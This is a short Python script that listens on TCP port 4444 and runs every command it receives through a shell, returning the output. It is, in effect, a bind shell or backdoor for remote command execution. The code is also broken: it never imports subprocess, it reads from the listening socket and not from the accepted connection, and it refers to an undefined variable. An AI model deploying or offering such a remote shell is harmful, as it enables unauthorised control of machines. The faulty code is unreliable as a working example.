import socket, sys, os

T = 1
host = socket.gethostbyname('localhost')
port = 4444

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((host, port))
sock.listen(T)
conn, addr = sock.accept()

while True:
    d = sock.recv(1024)
    if d[:2].decode("utf-8") == 'cd':
        os.chdir(d[3:].decode("utf-8"))
    elif len(d) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        sock.send(str.encode(output_str + str(os.getcwd()) + '> '))
sock.close()
sys.exit()
